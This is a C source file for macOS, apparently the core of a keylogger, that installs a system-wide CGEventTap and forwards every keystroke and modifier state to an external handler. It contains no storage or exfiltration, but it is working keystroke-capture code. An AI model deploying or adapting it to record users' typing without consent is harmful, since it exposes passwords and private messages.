#include <CoreFoundation/CoreFoundation.h>
#include <CoreGraphics/CoreGraphics.h>
#include "keylogger.h"

typedef enum State {
    Up,
    Down,
    Invalid
} State;

extern void handleButtonEvent(int k,
                              State s,
                              bool ctrl,
                              bool opt,
                              bool shift,
                              bool cmd);

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy,
                           CGEventType type,
                           CGEventRef event,
                           void *refcon) {
    // Validate the input event
    State state;
    if (type == kCGEventKeyDown) {
        state = Down;
    } else if (type == kCGEventKeyUp) {
        state = Up;
    } else if (type == kCGEventFlagsChanged) {
        state = Invalid;
    } else {
        return event;
    }

    // Retrieve the key code
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Detect modifier keys
    const CGEventFlags flags = CGEventGetFlags(event);
    bool ctrl = (flags & kCGEventFlagMaskControl) != 0;
    bool opt = (flags & kCGEventFlagMaskAlternate) != 0;
    bool shift = (flags & kCGEventFlagMaskShift) != 0;
    bool cmd = (flags & kCGEventFlagMaskCommand) != 0;

    handleButtonEvent((int)keyCode,
                      state,
                      ctrl,
                      opt,
                      shift,
                      cmd);

    return event;
}

static inline void listen() {
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);

    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap,
                                              kCGHeadInsertEventTap,
                                              0,
                                              eventMask,
                                              CGEventCallback,
                                              NULL);

    if (!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.");
        exit(1);
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(),
                       runLoopSource,
                       kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    CFRunLoopRun();
}
